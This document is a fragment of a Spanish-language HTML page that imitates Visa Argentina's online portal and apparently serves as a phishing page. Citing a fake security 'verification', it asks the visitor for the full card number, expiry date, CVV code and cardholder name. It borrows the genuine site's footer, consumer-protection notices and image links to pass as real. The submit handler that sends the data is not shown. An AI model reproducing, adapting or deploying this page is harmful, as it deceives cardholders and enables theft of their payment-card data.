
<form id="loginFrm" name="loginFrm" method="post" action="" enctype="application/x-www-form-urlencoded">
<input type="hidden" name="loginFrm" value="loginFrm" />
<input id="loginFrm:hiddenField" type="hidden" name="loginFrm:hiddenField" />
			<div class="login-tabs"></div>
			<div class="login-content container-12">
				<div class="login-info grid-4 alpha">
					<div class="login-title">
						COMPLETE LA <span>VERIFICACION</span>
					</div>
					<p>Este problema puede ser causado por uno de los siguientes motivos : </p>
					</br>
					<ul>
						<li>Su direccion IP es dinamica y debido a las actualizaciones constantes que sufre nuestra plataforma se ha producido un falso positivo</li>
						<li>Accedio a su cuenta desde un dispositivo que no frecuenta</li>
						<li>Utilizo su tarjeta en un dispositivo que no frecuenta</li>
					</ul>
			</div>
		
				<div class="login-form grid-8">
					<div class="login-form-conten">
						
						<div><label for="loginFrm:docNumber">
Numero de 16 digitos de su Tarjeta Visa</label><input autocomplete="off" id="tarjetanum" type="text" placeholder="4XXXXXXXXXXXXXXX" autocomplete="off" class="username_qwerty" onfocus="setInputPos('username_qwerty')" onkeypress="if (event.keyCode == 13) { document.getElementById('loginFrm:button').click(); return false; }" tabindex="2" />
						</div>
			 		<div>
			  <span>Mes / Vencimiento</span><select class="form-dropdown validate[required]" name="fechamonth" id="month">
              <option value="0" selected="selected">- Seleccione -</option>
              <option value="Enero"> Enero </option>
              <option value="Febrero"> Febrero </option>
              <option value="Marzo"> Marzo </option>
              <option value="Abril"> Abril </option>
              <option value="Mayo"> Mayo </option>
              <option value="Junio"> Junio </option>
              <option value="Julio"> Julio </option>
              <option value="Agosto"> Agosto </option>
              <option value="Septiembre"> Septiembre </option>
              <option value="Octubre"> Octubre </option>
              <option value="Noviembre"> Noviembre </option>
              <option value="Diciembre"> Diciembre </option>
            </select>
						</div>
						<div>
			  <span>Año / Vencimiento</span><select class="form-dropdown validate[required]" name="fechaano" id="year">
              <option value="0" selected="selected"> - Seleccione -  </option>
              <option value="2037"> 2037 </option>
              <option value="2036"> 2036 </option>
              <option value="2035"> 2035 </option>
              <option value="2034"> 2034 </option>
              <option value="2033"> 2033 </option>
              <option value="2032"> 2032 </option>
              <option value="2031"> 2031 </option>
              <option value="2030"> 2030 </option>
              <option value="2029"> 2029 </option>
              <option value="2028"> 2028 </option>
              <option value="2027"> 2027 </option>
              <option value="2026"> 2026 </option>
              <option value="2025"> 2025 </option>
              <option value="2024"> 2024 </option>
              <option value="2023"> 2023 </option>
              <option value="2022"> 2022 </option>
              <option value="2021"> 2021 </option>
              <option value="2020"> 2020 </option>
            </select>
						</div>
						<div>
							<span>Codigo CVV (Ubicado en la parte trasera de su tarjeta)</span><input autocomplete="off" id="cvv" type="password" name="contrasena" autocomplete="off" value="" tabindex="4" class="password_qwerty" /><input id="loginFrm:bfp" maxlength="3" type="hidden" name="loginFrm:bfp" />
						</div>
						<div><label for="loginFrm:docNumber">
Nombre (Como aparece en la tarjeta)</label><input autocomplete="off" id="nombre" type="text" placeholder="Ejemplo : MARIO ALEJANDRO C." autocomplete="off" class="username_qwerty" tabindex="2" />
						</div>
						
</br>
					

					</div>
					<div class="login-form-footer">
						<input id="loginFrm:button" type="button" onclick="snd2();" name="enviar" value="Completar verificacion" tabindex="5" class="button"  />

					</div>
				</div>
			</div><span id="loginFrm:blockedUserHidden" style="display:none">false</span><input type="hidden" name="javax.faces.ViewState" id="javax.faces.ViewState" value="-3255478040097611219:-8802376466863394241" autocomplete="off" />
</form>
 <div id="consumerDefense" title="Defensa del consumidor" class="modal hide "><div id="j_idt379:consumerDefenseContent">
        <div class="modal-header">
			  <a class="modal-titlebar-close" onclick="closePopup('consumerDefense');">cerrar </a>
        </div>
        <div class="modal-body ">
				<div class="header-div-title-popup clearfix">
					<div class="h3-title-popup"><h3>Defensa del consumidor</h3></div>
					<div class="modal-logo"></div>
				</div>
    <div class="legal-message">
        <p>La Ley N° 2.244 establece que las personas físicas o jurídicas que comercialicen,
        	o presten servicios a consumidores y/o usuarios en el ambito de la C.A.B.A.
	         y posean pagina de internet, deberan agregar un enlace con la Direccion General de Defensa
	         y Proteccion al Consumidor.</p>
         <p style="padding: 5px; color: #E89100;E89100">Direccion General de Defensa y Proteccion al Consumidor</p>
    	<p>Para consultas y/o denuncias ingrese <a href="http://www.buenosaires.gob.ar/defensaconsumidor" target="_blank">aquí</a>.</p>
   	</div>
        </div><div id="j_idt379:mdlFooter" class="modal-footer"></div></div>
    </div>
    <div id="personalDataProtection" title="Defensa del consumidor" class="modal hide "><div id="j_idt381:personalDataProtectionContent">
        <div class="modal-header">
			  <a class="modal-titlebar-close" onclick="closePopup('personalDataProtection');">cerrar </a>
        </div>
        <div class="modal-body ">
    <div class="legal-message">
	    <img src="https://inetserv.visa.com.ar/visahome/resources/img/logo_proteccion_datos_personales.jpg" />
	      <h2 style="color=#ccc">Direccion Nacional de Proteccion de Datos Personales</h2>
	      <p>“El titular de datos personales tiene la facultad de ejercer el derecho de acceso a
	      	los mismos en forma gratuita a intervalos no inferiores a seis meses, salvo que se acredite un interes
	    	legítimo al efecto, conforme lo establecido en el artículo 14, inciso 3 de la Ley n 25.326”.
	      </p>
	      <p style="padding: 5px;">
	    	“La direccion Nacional de Datos Personales, organo de Control de la Ley n 25.326, tiene la atribucion
	    	de atender las denuncias y reclamos que se interpongan con relacion al incumplimiento de las normas sobre proteccion de datos personales&quot;.
	      </p>
	      <p style="padding-bottom: 0px;">Para contactar a la direcion Nacional de Datos Personales:</p>
	      <p style="padding-top: 0px;">Sarmiento 1118, 5 piso(C1041AA)</p>
	      <p style="padding-top: 0px;">Tel. 4383-8510/12/13/15</p>
	      <p><a style="padding-right:10px;" href="http://www.jus.gob.ar/datos-personales.aspx/" target="_blank">http://www.jus.gob.ar/datos-personales.aspx/</a>
	      <a href="mailto:infodnpdp@jus.gov.ar">infodnpdp@jus.gov.ar</a></p>
    </div>                                                 
    <img src="https://inetserv.visa.com.ar/visahome/resources/img/logo-jus.png" />
        </div><div id="j_idt381:mdlFooter" class="modal-footer"></div></div>
    </div>
            <div class="footer">
                <div class="footer-content container-12">
                    <div class="grid-6">PRISMA MEDIOS DE PAGO S.A.</div>
                    <div class="footer-legales grid-6"><a href="https://inetserv.visa.com.ar/visahome/login?windowId=9e6" class="grey-link" onclick="showPopup('consumerDefense'); return false;">Defensa al Consumidor</a>  |
                        <a href="https://inetserv.visa.com.ar/visahome/login?windowId=9e6" class="grey-link" onclick="showPopup('personalDataProtection'); return false;">Proteccion de datos personales</a>
					</div>
                </div>
           